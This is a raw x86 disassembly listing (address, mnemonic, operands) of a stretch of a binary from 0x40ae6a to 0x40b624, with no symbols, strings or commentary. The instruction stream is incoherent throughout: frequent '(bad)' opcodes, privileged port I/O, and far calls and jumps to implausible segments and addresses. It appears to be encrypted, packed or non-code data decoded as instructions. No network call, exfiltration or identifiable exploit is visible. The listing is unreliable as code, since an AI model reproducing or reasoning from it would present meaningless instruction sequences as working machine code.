  40ae6a:	or     DWORD PTR [edx+edi*1+0x5d],esi
  40ae6e:	fcom   QWORD PTR [eax+ebp*1+0x2d]
  40ae72:	mov    dl,0xe7
  40ae74:	leave  
  40ae75:	(bad)
  40ae79:	repnz aam 0x1e
  40ae7c:	aas    
  40ae7d:	popf   
  40ae7e:	adc    eax,0xb9929ec8
  40ae83:	addr16 jmp 0x1ff18bb
  40ae89:	xchg   edi,eax
  40ae8a:	mov    ah,0x40
  40ae8c:	jmp    0xf1b60953
  40ae91:	call   0x4971:0x9276e6c9
  40ae98:	das    
  40ae99:	xchg   edx,eax
  40ae9a:	pop    edx
  40ae9b:	push   0xffc8a875
  40aea0:	mov    ch,0x5a
  40aea2:	xchg   edi,eax
  40aea3:	stos   BYTE PTR es:[edi],al
  40aea4:	jmp    0xd600bcdb
  40aea9:	xor    esi,DWORD PTR [ebx-0x3221ff19]
  40aeaf:	(bad)  
  40aeb0:	inc    DWORD PTR [eax]
  40aeb2:	test   al,0x6d
  40aeb4:	(bad)  
  40aeb5:	push   DWORD PTR [edi-0x59]
  40aeb8:	push   0xff449d9a
  40aebd:	dec    edi
  40aebe:	push   edi
  40aebf:	inc    eax
  40aec0:	pop    es
  40aec1:	call   0x3f9d70
  40aec6:	xor    BYTE PTR [edx-0x43],bl
  40aec9:	jmp    DWORD PTR [edi]
  40aecb:	jmp    0x7500:0x27184600
  40aed2:	xor    cl,BYTE PTR [edi-0x5]
  40aed5:	xor    ecx,DWORD PTR [eax+0x7c]
  40aed8:	(bad)  
  40aed9:	inc    DWORD PTR [edi+0x10aef1e6]
  40aedf:	push   cs
  40aee0:	jne    0x40ae6f
  40aee2:	xchg   DWORD PTR [eax-0x5],eax
  40aee5:	(bad)  
  40aee6:	std    
  40aee7:	or     al,0xe8
  40aee9:	ja     0x40aeae
  40aeeb:	out    0xfe,al
  40aeed:	pop    edi
  40aeee:	push   ss
  40aeef:	int3   
  40aef0:	rol    DWORD PTR [eax+ebx*2],0xa0
  40aef4:	mov    ch,ah
  40aef6:	lock add al,0x0
  40aef9:	out    dx,eax
  40aefa:	(bad)  
  40aefb:	ins    DWORD PTR es:[edi],dx
  40aefc:	mov    ebx,0xff0d5955
  40af01:	jne    0x40af17
  40af03:	in     al,dx
  40af04:	je     0x40af0e
  40af06:	mov    al,0xb9
  40af08:	in     eax,0xff
  40af0a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40af0b:	add    BYTE PTR fs:[eax],al
  40af0e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40af0f:	stos   BYTE PTR es:[edi],al
  40af10:	push   0xff4e1dc1
  40af15:	inc    BYTE PTR [eax]
  40af17:	std    
  40af18:	or     bh,bh
  40af1a:	jne    0x40af2c
  40af1c:	in     eax,0xb7
  40af1e:	out    0x57,al
  40af20:	jmp    0x40aeea
  40af22:	ret    0xce0
  40af25:	push   ebp
  40af26:	mov    esi,DWORD PTR [ecx]
  40af28:	into   
  40af29:	popa   
  40af2a:	jne    0x40af51
  40af2c:	retf   0xc211
  40af2f:	into   
  40af30:	iret   
  40af31:	or     eax,0xeb6c3dc0
  40af36:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40af37:	mov    eax,fs:0xbbc95003
  40af3d:	inc    ebx
  40af3e:	jmp    FWORD PTR [esi+0x1cfeb392]
  40af44:	pop    edx
  40af45:	imul   ebp,DWORD PTR [ebx-0x179e0062],0xffffffb8
  40af4c:	lds    esp,FWORD PTR [ecx-0x1]
  40af4f:	js     0x40af75
  40af51:	or     eax,DWORD PTR [eax]
  40af53:	(bad)  
  40af55:	outs   dx,BYTE PTR ds:[esi]
  40af56:	xor    DWORD PTR [ebp+0x5e],0xffffffec
  40af5a:	dec    DWORD PTR [eax]
  40af5c:	push   0x62
  40af5e:	jne    0x40af99
  40af60:	cmp    bl,BYTE PTR [ebp-0x74c89946]
  40af66:	inc    ebp
  40af67:	pop    ebp
  40af68:	int3   
  40af69:	add    ebp,DWORD PTR [eax-0x48]
  40af6c:	and    bl,al
  40af6e:	call   esi
  40af70:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40af71:	mov    bh,0x40
  40af73:	xor    DWORD PTR [edi+0x20e9b617],edx
  40af79:	add    al,0xe8
  40af7b:	add    BYTE PTR [eax+0x3aff61a2],dh
  40af81:	mov    ds:0xfa8113d8,al
  40af86:	add    al,BYTE PTR [eax]
  40af88:	push   cs
  40af89:	shl    BYTE PTR [ebx+0x6b6a9cfe],0x63
  40af90:	adc    cl,BYTE PTR [edi+0x1560e861]
  40af96:	popa   
  40af97:	dec    DWORD PTR [ebx+0x5f98eb62]
  40af9d:	and    DWORD PTR [eax+ebp*2],eax
  40afa0:	fimul  DWORD PTR [eax]
  40afa2:	mov    esp,0x1456e6c2
  40afa7:	call   0x4983:0x6be8ca69
  40afae:	dec    esi
  40afaf:	popa   
  40afb0:	cmp    cl,BYTE PTR [ecx-0x43]
  40afb3:	div    DWORD PTR [esi-0x1f]
  40afb6:	out    0x3,eax
  40afb8:	into   
  40afb9:	xchg   esi,eax
  40afba:	cdq    
  40afbb:	pusha  
  40afbc:	cmp    al,0x1
  40afbe:	inc    ecx
  40afbf:	sbb    BYTE PTR [edx+0x536c2657],dl
  40afc5:	xchg   esi,eax
  40afc6:	push   ds
  40afc7:	popa   
  40afc8:	or     ecx,DWORD PTR [ecx]
  40afca:	sub    DWORD PTR [edx-0x14173601],0x3a7bf55
  40afd4:	xchg   BYTE PTR ds:0x8f1cc37,bl
  40afda:	add    DWORD PTR ds:0xcee5771,esp
  40afe0:	add    BYTE PTR [ecx-0x24],dh
  40afe3:	cmc    
  40afe4:	mov    bl,0xf6
  40afe6:	push   edi
  40afe7:	push   esp
  40afe8:	or     al,0x49
  40afea:	add    dl,dh
  40afec:	pusha  
  40afed:	push   esi
  40afee:	pusha  
  40afef:	rcr    DWORD PTR [edi+0x453574e],1
  40aff5:	fldenv [ecx-0x10c13ce9]
  40affb:	and    edi,DWORD PTR [edx+0x16ae08f1]
  40b001:	out    0xc1,eax
  40b003:	daa    
  40b004:	add    al,0x19
  40b006:	push   ecx
  40b007:	pop    esi
  40b008:	pusha  
  40b009:	push   ds
  40b00a:	add    ebp,DWORD PTR [ecx+0x38b927d7]
  40b010:	popa   
  40b011:	test   BYTE PTR [ecx],al
  40b013:	xchg   ecx,eax
  40b014:	arpl   WORD PTR [edi],ax
  40b016:	push   edi
  40b017:	jle    0x40b084
  40b019:	out    dx,eax
  40b01a:	xchg   ebp,eax
  40b01b:	add    BYTE PTR [esi-0x6f],dh
  40b01e:	jecxz  0x40b01f
  40b020:	add    bh,al
  40b022:	mov    edi,0x80dae940
  40b027:	push   esi
  40b028:	test   al,0x32
  40b02a:	push   esi
  40b02b:	xor    eax,0xffc9ea9f
  40b030:	inc    eax
  40b031:	popa   
  40b032:	xchg   esi,eax
  40b033:	inc    DWORD PTR [esi+0x35]
  40b036:	dec    ecx
  40b037:	je     0x40b027
  40b039:	add    dh,0xfe
  40b03c:	mov    esp,0x2fb6612a
  40b041:	adc    DWORD PTR [esi-0x18],edx
  40b044:	dec    ebp
  40b045:	add    dh,al
  40b047:	push   esi
  40b048:	call   DWORD PTR [ebx-0x1e8aa862]
  40b04e:	or     dh,BYTE PTR [ecx]
  40b050:	dec    BYTE PTR [esi]
  40b052:	adc    ebx,esp
  40b054:	sbb    DWORD PTR [esi],eax
  40b056:	pop    edi
  40b057:	push   cs
  40b058:	call   0xff96c08c
  40b05d:	or     DWORD PTR [ebp+0x56],0x75
  40b061:	loope  0x40b03d
  40b063:	dec    esp
  40b064:	(bad)  
  40b065:	out    0x6,al
  40b067:	push   esi
  40b068:	jne    0x40b047
  40b06a:	(bad)  
  40b06b:	fild   DWORD PTR [edi]
  40b06d:	shl    esp,0x8f
  40b070:	dec    esi
  40b072:	cld    
  40b073:	dec    edx
  40b074:	add    al,0xe9
  40b076:	mov    DWORD PTR [ebx+0x258beec],eax
  40b07c:	call   0xff969e2e
  40b081:	loop   0x40b0f5
  40b083:	fisttp QWORD PTR [ebp+0x11]
  40b086:	jb     0x40b047
  40b088:	inc    eax
  40b089:	jmp    0xa9911e70
  40b08e:	jbe    0x40b0e6
  40b090:	push   eax
  40b091:	cmp    ebp,eax
  40b093:	in     eax,dx
  40b094:	(bad)  
  40b095:	call   FWORD PTR [eax]
  40b097:	out    0xbd,eax
  40b099:	push   0x409f3e
  40b09e:	sbb    BYTE PTR [esi-0xc4ff78c],dh
  40b0a4:	in     al,0xff
  40b0a6:	dec    edi
  40b0a7:	xchg   ebp,eax
  40b0a8:	add    DWORD PTR [bx+si],eax
  40b0ab:	enter  0xbde6,0x68
  40b0af:	or     eax,0x8800409f
  40b0b4:	mov    dh,0x74
  40b0b6:	or     BYTE PTR [eax+0x20],ah
  40b0b9:	in     eax,0xff
  40b0bb:	call   DWORD PTR [edi+eiz*2-0x421937fe]
  40b0c2:	push   0x409f43
  40b0c7:	call   0x40492582
  40b0cc:	pop    esp
  40b0cd:	in     al,0xff
  40b0cf:	aas    
  40b0d0:	in     eax,0x19
  40b0d2:	mov    esp,0xc2c8b63f
  40b0d7:	or     BYTE PTR [ecx],0x55
  40b0da:	mov    ebp,DWORD PTR [edx+ecx*4]
  40b0dd:	(bad)  
  40b0de:	cld    
  40b0df:	mov    dl,0x9
  40b0e1:	push   0x9
  40b0e3:	pop    edi
  40b0e4:	xor    BYTE PTR [edi],al
  40b0e6:	call   0x4024f7
  40b0eb:	loope  0x40b12d
  40b0ed:	sti    
  40b0ee:	push   0x62
  40b0f0:	mov    dh,0x74
  40b0f2:	or     BYTE PTR [eax-0x77],dh
  40b0f5:	(bad)  
  40b0f6:	jmp    FWORD PTR [edi+0x5f]
  40b0f9:	and    bh,bh
  40b0fb:	add    eax,0x7f76e805
  40b100:	mov    dh,0xfe
  40b102:	push   0xfffffffc
  40b104:	mov    bl,0x74
  40b106:	or     al,al
  40b108:	fs (bad) 
  40b10a:	(bad)  
  40b10b:	mov    edi,0xfc74b3
  40b110:	xor    DWORD PTR [ebx-0x28],edi
  40b113:	pop    es
  40b114:	sbb    DWORD PTR ds:0x9a06ff9d,ebx
  40b11a:	inc    ecx
  40b11b:	add    al,0x31
  40b11d:	std    
  40b11e:	mov    ch,ah
  40b120:	mov    esp,DWORD PTR [edx-0x15]
  40b123:	pop    ss
  40b124:	xchg   BYTE PTR [ecx],ah
  40b126:	add    al,0x68
  40b128:	das    
  40b129:	xchg   ebx,eax
  40b12a:	(bad)  
  40b12b:	(bad)  
  40b12c:	(bad)  
  40b12e:	xchg   ebp,eax
  40b12f:	dec    eax
  40b130:	jo     0x40b194
  40b132:	imul   edx,edx,0xffffff8f
  40b135:	ret    
  40b136:	pop    ebp
  40b137:	or     esi,ecx
  40b139:	xchg   esi,eax
  40b13a:	clc    
  40b13b:	dec    edi
  40b13c:	mov    esi,0x3cfef39d
  40b141:	outs   dx,BYTE PTR ds:[esi]
  40b142:	mov    bl,0xfe
  40b144:	and    al,0x6a
  40b146:	imul   ebx,DWORD PTR [eax-0x17a1d473],0xffffffd0
  40b14d:	out    0x5d,eax
  40b14f:	dec    DWORD PTR [ebx]
  40b151:	(bad)  
  40b152:	jmp    0x40b16b
  40b154:	out    0xa0,al
  40b156:	add    ebp,DWORD PTR [eax+0x2f]
  40b159:	jae    0x40b11f
  40b15b:	call   DWORD PTR [esi]
  40b15d:	pusha  
  40b15e:	add    eax,DWORD PTR [eax]
  40b160:	mov    cl,0xa
  40b162:	mov    ds:0x9636ebe,al
  40b167:	rcr    ch,0x54
  40b16a:	mov    bl,0xfe
  40b16c:	in     al,0x51
  40b16e:	pop    esp
  40b16f:	jne    0x40b196
  40b171:	adc    bl,BYTE PTR [ebp+0x75]
  40b174:	add    BYTE PTR [ecx],bh
  40b176:	dec    edx
  40b177:	jmp    0x40b15c
  40b179:	inc    esi
  40b17a:	dec    ebx
  40b17b:	ins    BYTE PTR es:[edi],dx
  40b17c:	jb     0x40b1f8
  40b17e:	xchg   ebx,eax
  40b17f:	pop    ebp
  40b180:	(bad)  
  40b181:	mov    esp,0x3d755c31
  40b186:	retf   0x565f
  40b189:	jo     0x40b194
  40b18b:	jmp    0x914255ec
  40b190:	or     BYTE PTR ds:0xf34b9654,0x4
  40b197:	jmp    0x6aa56d52
  40b19c:	dec    eax
  40b19d:	std    
  40b19e:	fsubp  st(0),st
  40b1a0:	jmp    0xc3d05cd
  40b1a5:	(bad)  [ecx-0x7e19a2cf]
  40b1ab:	lods   al,BYTE PTR ds:[esi]
  40b1ac:	pop    edi
  40b1ad:	dec    ecx
  40b1ae:	or     ecx,ebp
  40b1b0:	ins    BYTE PTR es:[edi],dx
  40b1b1:	xchg   edi,eax
  40b1b2:	loopne 0x40b201
  40b1b4:	mov    dh,0x71
  40b1b6:	or     DWORD PTR [esi-0x29],ecx
  40b1b9:	cs popa 
  40b1bb:	leave  
  40b1bc:	pop    esp
  40b1bd:	mov    esi,0x3102d153
  40b1c2:	fs ja  0x40b1b1
  40b1c5:	mov    al,ds:0xa603a7ba
  40b1ca:	(bad)  
  40b1cc:	imul   ebp,edi,0x53
  40b1cf:	push   ds
  40b1d0:	pop    ebp
  40b1d1:	xchg   esi,eax
  40b1d2:	fst    QWORD PTR [ebx*2+0x77010104]
  40b1d9:	add    cl,cl
  40b1db:	push   ebx
  40b1dc:	push   es
  40b1dd:	dec    ebx
  40b1de:	jae    0x40b1ec
  40b1e0:	jmp    0x68a55d9b
  40b1e5:	dec    eax
  40b1e6:	mov    DWORD PTR [ebx-0x12],ebx
  40b1e9:	pop    esp
  40b1ea:	mov    ah,0xcd
  40b1ec:	in     al,0xb3
  40b1ee:	pop    edi
  40b1ef:	fucomp st(4)
  40b1f1:	pop    esp
  40b1f2:	sbb    al,0x9b
  40b1f4:	and    ebx,eax
  40b1f6:	dec    esi
  40b1f7:	imul   eax,DWORD PTR [ebx],0xffffffa5
  40b1fa:	xor    DWORD PTR [ecx],ecx
  40b1fc:	repnz inc ebx
  40b1fe:	mov    fs,WORD PTR cs:[ecx+0x93102]
  40b205:	scas   al,BYTE PTR es:[edi]
  40b206:	neg    DWORD PTR [edx+0x0]
  40b209:	jmp    0x2d07bb40
  40b20e:	jns    0x40b262
  40b210:	pop    es
  40b211:	jmp    0x3409148
  40b216:	xor    eax,0x2d02ffdf
  40b21b:	test   BYTE PTR [ebp+0x7d],al
  40b21e:	ret    0x8585
  40b221:	jne    0x40b280
  40b223:	push   edx
  40b224:	call   FWORD PTR [ecx]
  40b226:	mov    esp,ds
  40b228:	imul   DWORD PTR [esi-0x1]
  40b22b:	dec    esi
  40b22c:	call   0x4a4696
  40b231:	bnd jb 0x40b211
  40b234:	add    al,0x40
  40b236:	dec    ecx
  40b237:	or     BYTE PTR [eax],al
  40b239:	jmp    0xa8892b18
  40b23e:	add    BYTE PTR [edx],dh
  40b240:	push   edx
  40b241:	jne    0x40b230
  40b243:	dec    edx
  40b244:	les    edi,FWORD PTR [ebp-0x7546f2ca]
  40b24a:	sbb    DWORD PTR [edi-0x2e10b74],esi
  40b250:	push   ecx
  40b251:	push   eax
  40b252:	mov    ebx,0x16be140a
  40b257:	in     eax,dx
  40b258:	jg     0x40b1df
  40b25a:	sbb    ebp,ebx
  40b25c:	push   ecx
  40b25d:	call   DWORD PTR [ecx]
  40b25f:	add    DWORD PTR [edi+0x5289feff],ecx
  40b265:	addr16 jp 0x40b20d
  40b268:	leave  
  40b269:	(bad)  
  40b26a:	in     eax,dx
  40b26b:	mov    esp,0xfae6f759
  40b270:	push   ecx
  40b271:	xor    eax,0xffc96597
  40b276:	rol    dh,0x93
  40b279:	dec    esi
  40b27b:	mov    ah,0x8c
  40b27d:	in     al,0x0
  40b27f:	jg     0x40b22f
  40b281:	(bad)  
  40b282:	push   0x48
  40b284:	pop    esi
  40b285:	test   BYTE PTR [edi+0x59],dl
  40b288:	or     eax,0xb5e8b5ff
  40b28d:	(bad)  
  40b28e:	call   edi
  40b290:	div    DWORD PTR [ebp-0x17f2b6b8]
  40b296:	jne    0x40b2fd
  40b298:	scas   al,BYTE PTR es:[edi]
  40b299:	dec    BYTE PTR [ecx-0x91e73]
  40b29f:	mov    bh,0x62
  40b2a1:	jmp    DWORD PTR [edi+0x0]
  40b2a4:	hlt    
  40b2a5:	xchg   esi,eax
  40b2a6:	inc    eax
  40b2a7:	add    BYTE PTR [edi+0x78],ah
  40b2aa:	lock not DWORD PTR [edi-0x52]
  40b2ae:	(bad)  
  40b2af:	xor    eax,0x4044be
  40b2b4:	adc    BYTE PTR [esi-0x7b980044],0x85
  40b2bb:	call   0x6b3f611f
  40b2c0:	enter  0x8d5d,0x57
  40b2c4:	mov    DWORD PTR ds:0xb668b5ff,eax
  40b2ca:	(bad)  
  40b2cb:	call   DWORD PTR [edi-0x8]
  40b2ce:	mov    ch,0x48
  40b2d0:	leave  
  40b2d1:	add    eax,0xadf539e8
  40b2d6:	dec    BYTE PTR [ecx-0x912e3]
  40b2dc:	aaa    
  40b2dd:	add    BYTE PTR [ebp-0x1518028],0x50
  40b2e4:	mov    al,ds:0x584156cd
  40b2e9:	scas   al,BYTE PTR es:[edi]
  40b2ea:	mov    ah,0xf0
  40b2ec:	pop    edi
  40b2ed:	scas   al,BYTE PTR es:[edi]
  40b2ee:	(bad)  
  40b2ef:	(bad)  
  40b2f0:	cmp    eax,0x48414877
  40b2f5:	fst    QWORD PTR ds:0x5a3b31bd
  40b2fb:	or     esi,DWORD PTR [ecx-0x45]
  40b2fe:	cld    
  40b2ff:	cmp    BYTE PTR [edi+eiz*4+0x52],0xff
  40b304:	ss imul edx,eax,0xf
  40b308:	add    BYTE PTR [esi],ch
  40b30a:	push   ebx
  40b30b:	mov    al,BYTE PTR [ebp-0xa567fb]
  40b311:	cmp    DWORD PTR [edx+0x66],0x6e7016b9
  40b318:	adc    al,0x3a
  40b31a:	mov    ds:0x8a6105cf,al
  40b31f:	xor    bh,BYTE PTR [ecx-0x7abd7802]
  40b325:	aad    0xd7
  40b327:	pop    ecx
  40b328:	inc    DWORD PTR [edx+eiz*2+0x3]
  40b32c:	add    BYTE PTR [edx-0x2108a0e3],dh
  40b332:	out    0x2,eax
  40b334:	je     0x40b382
  40b336:	jecxz  0x40b2cf
  40b338:	in     al,dx
  40b339:	(bad)  
  40b33a:	mov    bh,0x59
  40b33c:	add    BYTE PTR ds:0xc9bd869e,bh
  40b342:	cvtps2pd xmm7,xmm7
  40b345:	xor    DWORD PTR [esi+0x623167b6],edx
  40b34b:	push   0xffffffbe
  40b34d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b34e:	xchg   ebp,eax
  40b34f:	or     ebp,eax
  40b351:	pop    es
  40b352:	mov    al,0x59
  40b354:	call   DWORD PTR [esi-0x7108994b]
  40b35a:	neg    DWORD PTR [ecx+0x75]
  40b35d:	cmp    DWORD PTR [edx],ecx
  40b35f:	lods   eax,DWORD PTR ds:[esi]
  40b360:	mov    dh,0x7e
  40b362:	pop    es
  40b363:	pop    edx
  40b364:	mov    ch,0x89
  40b366:	push   edi
  40b367:	pop    ecx
  40b368:	jmp    FWORD PTR [esi-0x33]
  40b36b:	or     ch,al
  40b36d:	add    ch,al
  40b36f:	sbb    BYTE PTR [edx-0x1],bl
  40b372:	pop    esi
  40b373:	or     DWORD PTR [eax+eiz*2+0x59de505e],ebx
  40b37a:	les    eax,FWORD PTR [eax]
  40b37c:	ror    DWORD PTR [edx+0x59ce507f],0x84
  40b383:	imul   edi,DWORD PTR [esi+0x34503659],0x7f89190c
  40b38d:	pop    ecx
  40b38e:	es push eax
  40b390:	je     0x40b3ca
  40b392:	es push eax
  40b394:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b395:	pop    ecx
  40b396:	pushf  
  40b397:	add    DWORD PTR [ecx-0x69b03b0c],edx
  40b39d:	pop    ecx
  40b39e:	mov    esp,0xfe599664
  40b3a3:	pusha  
  40b3a4:	sbb    eax,0x7e4ff69b
  40b3a9:	(bad)  
  40b3aa:	fst    QWORD PTR [edi+0x76]
  40b3ad:	pop    ecx
  40b3ae:	fld    st(1)
  40b3b0:	das    
  40b3b1:	pop    ecx
  40b3b2:	fimul  WORD PTR [edi-0x64]
  40b3b5:	ins    BYTE PTR es:[edi],dx
  40b3b6:	fimul  WORD PTR [edi+0x5e]
  40b3b9:	ins    BYTE PTR es:[edi],dx
  40b3ba:	setb   BYTE PTR [esi+0x59]
  40b3be:	(bad)  
  40b3bf:	xchg   ebp,eax
  40b3c0:	dec    ecx
  40b3c1:	push   ecx
  40b3c2:	mov    esi,0x7815514f
  40b3c7:	dec    edi
  40b3c8:	ds pop ecx
  40b3ca:	in     al,0x58
  40b3cc:	ds pop ecx
  40b3ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b3cf:	pusha  
  40b3d0:	add    DWORD PTR [ebx+0x264f9e00],ebx
  40b3d6:	mov    edi,0x59d6619e
  40b3db:	mov    cs,WORD PTR [edi+0x16]
  40b3de:	iret   
  40b3df:	mov    ah,BYTE PTR [eax-0x5b]
  40b3e2:	sahf   
  40b3e3:	xor    DWORD PTR [ecx],ecx
  40b3e5:	xor    BYTE PTR [esi+0x29],al
  40b3e8:	or     DWORD PTR [esp+ecx*4+0x2d008b5d],edx
  40b3ef:	add    eax,0x2d82ffe3
  40b3f4:	push   eax
  40b3f5:	jne    0x40b3e8
  40b3f7:	retf   0xb612
  40b3fa:	fsubp  st(1),st
  40b3fc:	add    DWORD PTR [ebp-0x2b],0x39f7c5af
  40b403:	dec    ebp
  40b404:	pop    ss
  40b405:	push   edi
  40b406:	sub    BYTE PTR ds:0xf21623e1,ch
  40b40c:	dec    esi
  40b40d:	(bad)  
  40b40e:	cld    
  40b40f:	rol    cl,0x40
  40b412:	jmp    0xa6fc03a1
  40b417:	jns    0x40b41b
  40b419:	rcl    BYTE PTR ds:0xe867bf00,0x32
  40b420:	pop    esi
  40b421:	mov    esi,0x5056ef8e
  40b426:	xchg   bh,ah
  40b428:	push   es
  40b429:	call   0xff8edc9f
  40b42e:	xor    DWORD PTR [ebp-0x6f],0xc4b76eff
  40b435:	idiv   DWORD PTR [ecx+0x56c7ca00]
  40b43b:	test   al,0x32
  40b43d:	loope  0x40b462
  40b43f:	mov    esi,0x14fe4ef3
  40b444:	mov    ds:0x4ae940c1,eax
  40b449:	inc    ebx
  40b44a:	mov    ebx,0xc002093e
  40b44f:	mov    ebp,0xeb67bea1
  40b454:	xor    bl,BYTE PTR [esi-0x42]
  40b457:	es addr16 push esi
  40b45a:	push   eax
  40b45b:	push   ds
  40b45c:	jg     0x40b464
  40b45e:	call   0xff8efd20
  40b463:	add    DWORD PTR [ecx],eax
  40b465:	xchg   ecx,eax
  40b466:	inc    DWORD PTR [eax]
  40b468:	das    
  40b469:	bound  edx,QWORD PTR [esi+0x57]
  40b46c:	cdq    
  40b46d:	or     bh,bh
  40b46f:	jne    0x40b4c1
  40b471:	loop   0x40b4e9
  40b473:	std    
  40b474:	dec    edi
  40b475:	mov    dh,0xfe
  40b477:	jne    0x40b4c5
  40b479:	mov    dh,0x74
  40b47b:	or     BYTE PTR [eax-0x50],ah
  40b47e:	mov    ah,0xff
  40b480:	pop    edi
  40b481:	mov    esp,0x994804c1
  40b486:	mov    ch,ah
  40b488:	leave  
  40b489:	enter  0xf7db,0xef
  40b48d:	mov    ch,0x8c
  40b48f:	inc    ebp
  40b490:	fcom   QWORD PTR [esi+edi*8+0x34b6fc75]
  40b497:	mov    dh,0x60
  40b499:	inc    esp
  40b49a:	jmp    edi
  40b49c:	add    BYTE PTR [edx+0x130000a9],cl
  40b4a2:	retf   0x850e
  40b4a5:	leave  
  40b4a6:	add    eax,DWORD PTR [eax]
  40b4a8:	add    bh,al
  40b4aa:	inc    edi
  40b4ab:	test   DWORD PTR [eax],0xc70009d8
  40b4b1:	adc    eax,0xc807feb9
  40b4b6:	or     DWORD PTR [edx+0x0],ebp
  40b4b9:	add    cl,BYTE PTR [edx]
  40b4bb:	push   0x0
  40b4bd:	loop   0x40b4c8
  40b4bf:	lea    eax,[ebp+0x64]
  40b4c2:	xchg   ebp,eax
  40b4c3:	mov    WORD PTR [ebp-0x1419c],es
  40b4c9:	cwde   
  40b4ca:	mov    dh,0x74
  40b4cc:	clc    
  40b4cd:	outs   dx,DWORD PTR ds:[esi]
  40b4ce:	cmp    bl,bh
  40b4d0:	call   0x412249
  40b4d5:	xchg   ebx,eax
  40b4d6:	leave  
  40b4d7:	jae    0x40b4de
  40b4d9:	inc    ecx
  40b4da:	mov    DWORD PTR [ecx],eax
  40b4dc:	add    BYTE PTR [eax+0x31489161],bl
  40b4e2:	mov    eax,ds:0x2c04ff03
  40b4e7:	imul   esi,DWORD PTR [ebp+0x505706ba],0xffffffba
  40b4ee:	out    dx,eax
  40b4ef:	mov    BYTE PTR [ebp-0xa9b1a3],al
  40b4f5:	add    DWORD PTR [edx+0x6b],esi
  40b4f8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b4f9:	call   0x4e2f:0xb4895666
  40b500:	inc    DWORD PTR [eax]
  40b502:	inc    esi
  40b503:	inc    edi
  40b504:	pop    edx
  40b505:	mov    bh,0x3e
  40b507:	ds jmp 0xae0c840c
  40b50d:	inc    eax
  40b50e:	xor    DWORD PTR [ebx-0x6be10f70],ecx
  40b514:	push   esi
  40b515:	jmp    DWORD PTR [esp+edx*8-0x36]
  40b519:	inc    eax
  40b51a:	xor    DWORD PTR [edx+0x5a],edi
  40b51d:	mov    edx,0x858c6c0e
  40b522:	or     eax,0x8bff566c
  40b527:	(bad)  
  40b528:	jmp    0x40b4c6
  40b52a:	pop    esi
  40b52b:	and    DWORD PTR [edi+edi*8],eax
  40b52e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b52f:	ror    BYTE PTR [ebp-0x1],cl
  40b532:	out    0xd3,al
  40b534:	movzx  ebp,BYTE PTR [ecx+0x21]
  40b538:	add    al,0xe8
  40b53a:	hlt    
  40b53b:	test   al,0x56
  40b53d:	(bad)  
  40b53e:	mov    eax,0xc6f766e5
  40b543:	mov    bl,0xe8
  40b545:	call   DWORD PTR [esi-0x7c]
  40b548:	scas   al,BYTE PTR es:[edi]
  40b549:	inc    eax
  40b54a:	xor    ebx,eax
  40b54c:	(bad)  
  40b54d:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b54f:	or     edx,DWORD PTR [esi-0x1]
  40b552:	pop    esp
  40b553:	int3   
  40b554:	retf   0x3140
  40b557:	retf   0xba95
  40b55a:	xchg   esi,eax
  40b55b:	or     DWORD PTR [esi],esp
  40b55d:	mov    WORD PTR [ecx+ebp*2-0x2079a9ea],?
  40b564:	call   0xb50bb654
  40b569:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b56a:	add    esi,DWORD PTR [esi-0x6a]
  40b56d:	stc    
  40b56e:	dec    ebp
  40b56f:	outs   dx,BYTE PTR ds:[esi]
  40b570:	dec    esp
  40b571:	dec    BYTE PTR [edi]
  40b573:	lahf   
  40b574:	shl    DWORD PTR [edi+0x33aa4903],0x56
  40b57b:	push   esi
  40b57c:	sub    BYTE PTR [esp+ebp*2+0x46],0x4c
  40b581:	fsubp  st(2),st
  40b583:	inc    esi
  40b584:	in     al,0x93
  40b586:	lods   eax,DWORD PTR ds:[esi]
  40b587:	icebp  
  40b588:	or     dh,cl
  40b58a:	pop    DWORD PTR [ecx+0x54]
  40b58d:	(bad)  
  40b58e:	push   ebp
  40b58f:	cs push ss
  40b591:	ja     0x40b55f
  40b593:	jno    0x40b59e
  40b595:	rol    DWORD PTR [ecx-0x7451b425],0xac
  40b59c:	sub    al,0x9e
  40b59e:	push   ebp
  40b59f:	push   cs
  40b5a0:	mov    BYTE PTR [eax+eiz*2-0x2],bl
  40b5a4:	dec    ebx
  40b5a5:	xchg   esi,eax
  40b5a6:	add    al,0x85
  40b5a8:	out    0x69,al
  40b5aa:	xchg   edi,eax
  40b5ab:	add    eax,0x31558654
  40b5b0:	aad    0x1c
  40b5b2:	and    DWORD PTR [eax+eiz*2+0x8de557e],0x94eb0f5
  40b5bd:	jmp    0xd48c4526
  40b5c2:	or     ebx,ecx
  40b5c4:	pop    edx
  40b5c5:	call   0x68:0x944bbe55
  40b5cc:	mov    esi,0x2455464b
  40b5d1:	add    DWORD PTR [ecx-0x3e],edx
  40b5d4:	loop   0x40b621
  40b5d6:	add    BYTE PTR [esi],dh
  40b5d8:	add    al,0x96
  40b5da:	call   0xff8cb215
  40b5df:	pushf  
  40b5e0:	cmp    ah,BYTE PTR [ecx+0x34]
  40b5e3:	push   ebp
  40b5e4:	fmul   QWORD PTR [ebx-0x1]
  40b5e7:	pop    esp
  40b5e8:	adc    DWORD PTR [edi+edi*8+0xe],edx
  40b5ec:	(bad)  
  40b5ee:	pop    es
  40b5ef:	adc    DWORD PTR [edi-0x6b],ecx
  40b5f2:	(bad)  
  40b5f3:	(bad)  
  40b5f4:	std    
  40b5f5:	xchg   ebp,eax
  40b5f6:	loopne 0x40b5f6
  40b5f8:	add    eax,0x2a74ff4c
  40b5fd:	popa   
  40b5fe:	sbb    BYTE PTR [ebp-0x6b00b41b],bl
  40b604:	(bad)  
  40b605:	push   ebx
  40b606:	call   esi
  40b608:	in     eax,0xd5
  40b60a:	pop    es
  40b60b:	shr    DWORD PTR [eax],0x95
  40b60e:	inc    esi
  40b610:	test   DWORD PTR [esp+eiz*8-0x17b5824a],edx
  40b617:	lds    ebp,FWORD PTR [edx+ecx*2+0x5da7aeff]
  40b61e:	mul    DWORD PTR [esi+0x57e16165]
  40b624:	pop    ebp
